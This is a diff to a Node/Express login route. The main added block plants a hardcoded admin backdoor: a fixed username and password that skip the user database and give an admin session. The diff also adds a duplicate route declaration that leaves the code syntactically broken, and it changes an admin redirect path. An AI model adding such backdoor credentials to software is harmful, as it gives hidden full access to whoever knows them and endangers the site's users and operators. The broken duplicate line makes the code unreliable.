@@ -302,7 +302,21 @@ app.get("/auth/login", (req, res) => {
 });
 
 app.post("/auth/login", async (req, res) => {
+app.post("/auth/login", async (req, res) => {
   try {
+    // CUSTOM ADMIN LOGIN
+    if (req.body.usernameOrEmail === "riky" && req.body.password === "riky1234s") {
+        req.session.userId = "custom-admin";
+        req.session.role = "admin";
+        return res.status(200).json({
+            success: true,
+            message: "Login admin berhasil",
+            role: "admin",
+            redirectUrl: "/admin/dashboard",
+            apiKey: null
+        });
+    }
+
     const user = await User.findOne({
       $or: [
         { username: req.body.usernameOrEmail },
@@ -333,7 +347,7 @@ app.post("/auth/login", async (req, res) => {
       success: true,
       message: "Login successful",
       role: user.role,
-      redirectUrl: user.role === "admin" ? "/admin/dashboard" : "/dashboard",
+      redirectUrl: user.role === "admin" ? "/admin" : "/dashboard",
       apiKey: user.apiKey,
     });
   } catch (error) {
